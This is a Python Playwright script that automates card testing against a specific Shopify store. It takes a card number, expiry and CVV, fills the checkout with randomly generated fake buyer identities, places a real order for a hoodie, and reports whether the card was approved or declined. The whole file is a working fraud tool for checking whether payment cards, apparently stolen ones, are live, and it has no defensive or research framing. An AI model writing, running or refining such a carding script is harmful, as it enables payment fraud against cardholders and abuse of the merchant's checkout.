#!/usr/bin/env python3
import asyncio
import random
import string
from playwright.async_api import async_playwright

PRODUCT_URL = "https://bluewoodskiarea.myshopify.com/products/barcode-zip-hoodie"
BASE_URL = "https://bluewoodskiarea.myshopify.com"

def random_email():
    return f"test{random.randint(100000, 999999)}@example.com"

def random_name():
    first = ''.join(random.choices(string.ascii_letters, k=random.randint(5, 8)))
    last = ''.join(random.choices(string.ascii_letters, k=random.randint(5, 8)))
    return first.capitalize(), last.capitalize()

def random_address():
    street_num = random.randint(100, 9999)
    street = random.choice(['Main St', 'Oak Ave', 'Maple Dr', 'Cedar Ln', 'Pine St'])
    city = random.choice(['Los Angeles', 'New York', 'Chicago', 'Houston', 'Phoenix'])
    state = random.choice(['CA', 'NY', 'IL', 'TX', 'AZ'])
    zip_code = random.choice(['90210', '10001', '60601', '77001', '85001'])
    phone = f"{random.randint(200, 999)}-{random.randint(100, 999)}-{random.randint(1000, 9999)}"
    return f"{street_num} {street}", city, state, zip_code, phone

async def check_card(card_line):
    cc, mm, yy, cvv = card_line.split('|')
    if len(mm) == 1:
        mm = "0" + mm
    if "20" not in yy:
        yy = f"20{yy}"

    email = random_email()
    first_name, last_name = random_name()
    address, city, state, zip_code, phone = random_address()

    print(f"[*] Using details: {first_name} {last_name}, {email}, {address}, {city}, {state} {zip_code}")

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=False)
        context = await browser.new_context(
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        )
        page = await context.new_page()

        print("[*] Getting variant ID...")
        await page.goto(PRODUCT_URL, wait_until="networkidle", timeout=60000)
        variant_id = await page.evaluate("""
            () => {
                const select = document.querySelector('select[name="id"]');
                if (select && select.options.length) return select.options[0].value;
                return null;
            }
        """)
        if not variant_id:
            variant_id = "42388187578411"
        print(f"[+] Variant ID: {variant_id}")

        print("[*] Adding to cart...")
        await page.evaluate(f"""
            fetch('/cart/add.js', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{ id: {variant_id}, quantity: 1 }})
            }})
        """)
        await page.wait_for_timeout(3000)

        print("[*] Going to cart...")
        await page.goto(BASE_URL + "/cart", wait_until="networkidle", timeout=60000)
        await page.wait_for_timeout(2000)

        print("[*] Getting checkout URL...")
        checkout_url = await page.evaluate("""
            () => {
                const btn = document.querySelector('a[href*="/checkout"], button:has-text("Checkout")');
                if (btn && btn.href) return btn.href;
                return null;
            }
        """)
        if not checkout_url:
            checkout_url = BASE_URL + "/checkout"
        print(f"[+] Checkout URL: {checkout_url}")

        print("[*] Navigating to checkout...")
        await page.goto(checkout_url, wait_until="networkidle", timeout=60000)
        await page.wait_for_timeout(5000)

        print("[*] Filling email...")
        email_field = page.locator('input[name="checkout[email]"]')
        if await email_field.count():
            await email_field.fill(email)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(3000)

        print("[*] Filling shipping address...")
        try:
            await page.wait_for_selector('input[name="checkout[shipping_address][first_name]"]', timeout=15000)
        except:
            print("[!] Shipping form not found")
        if await page.locator('input[name="checkout[shipping_address][first_name]"]').count():
            await page.fill('input[name="checkout[shipping_address][first_name]"]', first_name)
            await page.fill('input[name="checkout[shipping_address][last_name]"]', last_name)
            await page.fill('input[name="checkout[shipping_address][address1]"]', address)
            await page.fill('input[name="checkout[shipping_address][city]"]', city)
            province_sel = page.locator('select[name="checkout[shipping_address][province]"]')
            if await province_sel.count():
                await province_sel.select_option(state)
            else:
                await page.fill('input[name="checkout[shipping_address][province]"]', state)
            await page.fill('input[name="checkout[shipping_address][zip]"]', zip_code)
            await page.fill('input[name="checkout[shipping_address][phone]"]', phone)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(3000)

        print("[*] Selecting shipping method...")
        shipping_method = page.locator('.shipping-method__label, input[type="radio"][name="checkout[shipping_rate][id]"]')
        if await shipping_method.count():
            await shipping_method.first.click()
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(5000)

        print("[*] Entering card details...")
        try:
            await page.wait_for_selector('iframe[title*="Secure card payment"]', timeout=20000)
            frame = page.frame_locator('iframe[title*="Secure card payment"]').first
            await frame.locator('input[data-elements-stable-field-name="cardNumber"]').fill(cc)
            await frame.locator('input[data-elements-stable-field-name="cardExpiry"]').fill(f"{mm}/{yy[-2:]}")
            await frame.locator('input[data-elements-stable-field-name="cardCvc"]').fill(cvv)
        except Exception as e:
            print(f"❌ Payment iframe error: {e}")
            await page.screenshot(path="payment_error.png")
            await browser.close()
            return

        print("[*] Submitting order...")
        await page.click('button[type="submit"]')
        await page.wait_for_timeout(5000)

        content = await page.content()
        if "thank you" in content.lower() or "order confirmed" in content.lower():
            print("✅ Order placed successfully!")
            result = "APPROVED"
        else:
            error = await page.locator('.woocommerce-error, .error-message, [role="alert"]').first.text_content()
            print(f"❌ Order failed: {error}")
            result = f"DECLINED: {error}"

        await browser.close()
        return result

async def main():
    card = input("Enter card (CC|MM|YY|CVV): ").strip()
    result = await check_card(card)
    print(f"Final result: {result}")

if __name__ == "__main__":
    asyncio.run(main())